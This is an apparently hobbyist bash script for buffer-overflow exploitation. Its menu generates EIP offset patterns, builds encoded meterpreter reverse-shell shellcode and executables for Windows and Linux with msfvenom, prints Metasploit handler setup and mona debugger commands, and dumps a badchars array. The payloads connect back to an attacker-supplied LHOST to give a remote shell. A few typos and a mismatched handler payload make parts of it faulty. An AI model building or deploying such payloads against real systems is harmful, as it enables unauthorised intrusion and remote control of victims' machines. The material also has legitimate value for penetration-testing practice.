#!/bin/bash

# --------------------------------- handles creating misc payloads ------------------------------------
#                                        written by WillChaos
# -----------------------------------------------------------------------------------------------------
#
# Requires:
# - Kali (or MSFTools installed in the correct path)
# - gem install rex-text (for pattern_create.rb)
# - chmod +x thisFile.sh

# Functions
generate_msfpayload () {

    # rev shell call back options
    echo -n " [?] What is your LHOST ip? (kali box)"
    read PG_LHOST
    echo -n " [?] What is your LPORT (nc listerner port)"
    read PG_LPORT

    # payload options
    echo -n " [?] OS for the payload to target (win,lin)"
    read TARGET_OS
    echo -n " [?] If you have any badchars, add them here (example: \x00\x0a\x0d)"
    read BAD_CHARS
    echo -n " [?] shellcode EXITFUNC (example: process,thread,seh)"
    read PG_EXITFUNC

    echo "     1. Shellcode based payload"
    echo "     2. Binary based payload"
    echo "[]> Select option [ENTER]"
    read payload_option
     echo

        if [ "$payload_option" == "1" ]; then
          echo "[*] Generating Shellcode based payload"
              if [ "$TARGET_OS" == "win" ]; then
                  echo " [*] Targetting windows "
                  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$PG_LHOST LPORT=$PG_LPORT -f c -e x86/shikata_ga_nai -b $BAD_CHARS exitfunc=$PG_EXITFUNC
                  echo "

                  "
              elif [ "$TARGET_OS" == "lin"]; then
                  echo " [*] generating linux based reverse shell binary..."
                  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$PG_LHOST LPORT=$PG_LPORT -f c -e x86/shikata_ga_nai -b $BAD_CHARS exitfunc=$PG_EXITFUNC
                  echo "

                 "
              else
                echo " [!] Ivalid selection"
              fi
        elif [ "$payload_option" == "2" ]; then
          echo " [*] Generating staged binary based payload"
              if [ "$TARGET_OS" == "win" ]; then
                  echo " [*] Building staged https windows meterpreter reverse shell"
                  msfvenom -p windows/meterpreter/reverse_https LHOST=$PG_LHOST LPORT=$PG_LPORT -f exe -o revShellHTTPS.exe 
                  echo "
                            USE:
                            use exploit/multi/handler
                            set PAYLOAD windows/shell/reverse_tcp 
                            set LHOST $PG_LHOST
                            set LPORT $PG_LPORT
                            set ExitOnSession false
                            exploit -j -z
                  "
              elif [ "$TARGET_OS" == "lin"]; then
                  echo " [*] generating linux based reverse shell binary..."
                  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$PG_LHOST LPORT=$PG_LPORT -f elf > shell.elf
                  ehco "
                            USE:
                            use exploit/multi/handler
                            set PAYLOAD payload linux/x86/shell/reverse_tcp
                            set LHOST $PG_LHOST
                            set LPORT $PG_LPORT
                            set ExitOnSession false
                            exploit -j -z

                 "
              else
                echo " [!] Ivalid selection"

              fi

        else
          echo " [!] Ivalid selection"
        fi

}


run_ldo () {
  echo " [*] Executed option 4 - output below."
  echo
  echo " ____________________________________________________________________________________________"
  echo " # search dll or module for paticular instructions using immunity"
  echo " Command:  !mona find -s '\xff\xe4' -m slmfc.dll"
  echo
  echo " #check all DLLs and modules mapped in memory by debugged application using immunity "
  echo " Command:  !mona modules "
  echo
  echo " # Get return codes using NASM Shell"
  echo " Command: /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb "
  echo "          NASM> jmp esp "
  echo "            --> 00000000  FFE4              jmp esp"
  echo "_____________________________________________________________________________________________"
}

run_genBytes () {
  echo "[*] Executing Unique byte manager"
  echo -n "[?] How many unique bytes would you like to generate?"
  read uBytes
  echo "[*] Generating payload"
  ruby /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l $uBytes
  echo
  echo -n "[?] Copy and paste the bytes that overwrote EIP"
  read uOffset
  echo "[*] Generating offset (how many bytes deep does EIP overwrite)"
  ruby /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $uOffset
  echo "[*] Dumping All Chars to begin checking for badchars"
  echo "
                                                                       #All characters
	badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
                    "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
                    "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
                    "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
                    "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
                    "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
                    "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
                    "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
  "
}


# main menu
echo "[----------------------------------------------------------------------------------------------]"
echo "[    Press 1 : Generate unqieue bytes (for detecting EIP overwrite)                            ]"
echo "[    Press 2 : Generate shell/Binary based payload usinf msfvenom (used for shells/rev shells) ]"
echo "[    Press 3 : RSG (reverse Shell Generator - dump a list of Reverse shell one-liners)         ]"
echo "[    Press 4 : LDO - List debugger one-liners (just simple debuuger/BOF commands for mona etc) ]"
echo "[----------------------------------------------------------------------------------------------]"
echo

echo -n " [*] Select option [ENTER]"
read menu_option
echo

if [ "$menu_option" == "1" ]; then
  run_genBytes

elif [ "$menu_option" == "2" ]; then
  generate_msfpayload

elif [ "$menu_option" == "3" ]; then
  echo " [*] You selected option 3"

elif [ "$menu_option" == "4" ]; then
  run_ldo
else
  echo " [!] Ivalid selection"

fi

